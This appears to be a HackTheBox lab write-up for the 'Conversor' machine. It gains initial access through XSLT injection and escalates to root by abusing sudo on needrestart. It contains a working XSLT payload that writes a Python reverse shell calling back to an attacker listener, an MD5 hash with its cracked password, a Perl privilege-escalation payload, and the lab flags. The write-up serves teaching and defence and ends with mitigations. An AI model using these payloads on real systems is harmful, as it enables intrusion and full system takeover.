# Conversor - HackTheBox Writeup

**Date:** 2026-03-28
**OS:** Linux (Ubuntu 22.04)
**IP Address:** 10.129.238.31
**Difficulty:** Medium
**Points:** 30

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Conversor**. 

*   **Initial Access:** Gained via an XSLT Injection vulnerability on the `/convert` endpoint. This allowed writing a malicious Python script to the server, which was then executed to provide a reverse shell.
*   **Privilege Escalation:** Achieved by abusing the `needrestart` utility. The user `fismathack` had sudo privileges to run `needrestart` without a password. By passing a custom Perl configuration file using the `-c` flag, arbitrary code execution was obtained as root.
*   **Key Learning Points:** 
    * XSLT Injection can lead to RCE when dangerous extensions or insecure configurations are used.
    * Improperly configured sudo permissions on administrative utilities like `needrestart` can lead to full system compromise.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 22 | SSH | OpenSSH 8.9p1 | Standard Ubuntu SSH service. |
| 80 | HTTP | gunicorn | Flask application serving the "Conversor" tool. |

**Nmap Command:**
```bash
nmap -sC -sV -oN nmap/initial 10.129.238.31
```

## 2.2. Web Enumeration
**Strategy:** Directory brute forcing and manual inspection of the web application.

### Directory Brute Forcing
```bash
gobuster dir -u http://conversor.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Discovered endpoints: `/login`, `/register`, `/convert`, `/about`.

---

# 3. Initial Access (User Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** XSLT Injection leading to Remote Code Execution (RCE).
*   **Vector:** The `/convert` endpoint accepts XML and XSLT files for transformation. The backend uses the `ptswarm` library that supports the `document` extension, enabling file creation on the server.

## 3.2. Exploitation Path

The exploitation process involved using the found XSLT injection to write a malicious Python script to a directory on the server that is regularly scanned or executed.

### Step-by-Step Walkthrough:

#### Step 1: Crafting the Payload
We craft a malicious XSLT file (`reverseshell.xslt`) that uses the `ptswarm:document` extension to write a Python reverse shell to `/var/www/conversor.htb/scripts/test2.py`.

**`version.xml` (Base XML):**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
 <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

**`reverseshell.xslt`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/test2.py" method="text">
import os

os.system(
    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.67\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
)
  </ptswarm:document>
</xsl:template>
</xsl:stylesheet>
```

#### Step 2: Gaining a Shell
After uploading the XML and XSLT files, the reverse shell is triggered, connecting back to the attacker's listener on port 4444.

```bash
nc -lvnp 4444
# Connection from 10.129.238.31
www-data@conversor:/var/www/conversor.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Step 3: Local Enumeration (www-data)
Upon gaining access as `www-data`, we explored the system. We identified a user `fismathack` in `/home` but were unable to read their files. We then navigated to the web application root `/var/www/conversor.htb/` and discovered the application structure.

```bash
ls -la /var/www/conversor.htb/
# total 44
# -rwxr-x--- 1 www-data www-data 4466 Aug 14  2025 app.py
# drwxr-x--- 2 www-data www-data 4096 Mar 28 22:11 instance
```

Searching the `instance` directory revealed a SQLite database.

```bash
ls -la /var/www/conversor.htb/instance/
# total 24
# -rw-r-xr-- 1 www-data www-data 20480 Mar 28 22:11 users.db
```

#### Step 4: Database Enumeration & Hash Cracking
We extracted the `users` table from the database to find credentials.

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
```

**Output:**
```text
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
```

The MD5 hash `5b5c3ac3a1c897c94caad48e6c71fdec` was then cracked using a wordlist or online service.

**Result:**
```text
5b5c3ac3a1c897c94caad48e6c71fdec : Keepmesafeandwarm
```

#### Step 5: Gaining SSH Access & User Flag
Using the cracked credentials, we established an SSH session as `fismathack` and retrieved the user flag.

```bash
ssh fismathack@10.129.238.31
# Password: Keepmesafeandwarm
fismathack@conversor:~$ cat user.txt
# 131ec3ccb6fcb4af4084d25f40b4d247
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Upon gaining SSH access as `fismathack`, we performed initial local enumeration to identify potential privilege escalation vectors. Checking sudo privileges revealed a significant misconfiguration:

```bash
sudo -l
# User fismathack may run the following commands on conversor:
# (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

The user `fismathack` has permission to run `/usr/sbin/needrestart` with `ALL` privileges (root) without requiring a password. 

## 4.2. Exploitation Path: `needrestart` Configuration Abuse

### Vulnerability Analysis
`needrestart` is a utility used to identify and restart services that need to be restarted after library updates. In version 3.7, the utility supports a `-c` flag which allows the user to specify a custom configuration file. 

The core vulnerability lies in how `needrestart` processes this configuration file: it reads the entire content of the file and passes it to the Perl `eval` function. Since `needrestart` is running as root (via `sudo`), any Perl code within the provided configuration file is executed with full root privileges.

### Step-by-Step Walkthrough:

#### Step 1: Crafting the Malicious Configuration
We create a Perl script (`root.pl`) designed to extract the root flag. The script uses the `system()` function to execute shell commands. In this case, we copy the root flag to `/tmp` and make it world-readable.

**Exploit Payload (`root.pl`):**
```perl
# This script is executed by needrestart via eval.
# We use system() to execute shell commands as root.
system("cat /root/root.txt > /tmp/root_flag.txt; chmod 666 /tmp/root_flag.txt");
```

#### Step 2: Triggering the Exploit
We execute `needrestart` using `sudo` and pass our malicious configuration file using the `-c` flag.

**Execution:**
```bash
sudo /usr/sbin/needrestart -c /home/fismathack/exploit/root.pl
```

#### Step 3: Verifying Root Execution
The execution of the command triggers the Perl `eval`, which in turn runs our `system()` call. We can then verify that the root flag has been successfully copied and read it.

**Root Flag Retrieval:**
```bash
ls -l /tmp/root_flag.txt
# -rw-rw-rw- 1 root root 33 Mar 28 22:45 /tmp/root_flag.txt

cat /tmp/root_flag.txt
# 500fe8371fb31d8ec598411b333cef79
```

---

---

# 5. Credentials & Loot

| Item | Value | Source |
| :--- | :--- | :--- |
| **User: fismathack** | `Keepmesafeandwarm` | `/var/www/conversor.htb/instance/users.db` |
| **User Flag** | `131ec3ccb6fcb4af4084d25f40b4d247` | `/home/fismathack/user.txt` |
| **Root Flag** | `500fe8371fb31d8ec598411b333cef79` | `/root/root.txt` |

---

# 6. Recommendations & Mitigation
1. **XSLT Injection:** Disable dangerous XSLT extensions and ensure that the transformation engine is configured with restricted permissions. Sanitize all user-provided XML and XSLT inputs.
2. **needrestart:** Update `needrestart` to version 3.8 or later to resolve several vulnerabilities. Avoid granting NOPASSWD sudo access to administrative tools that can execute arbitrary code or load untrusted configurations.

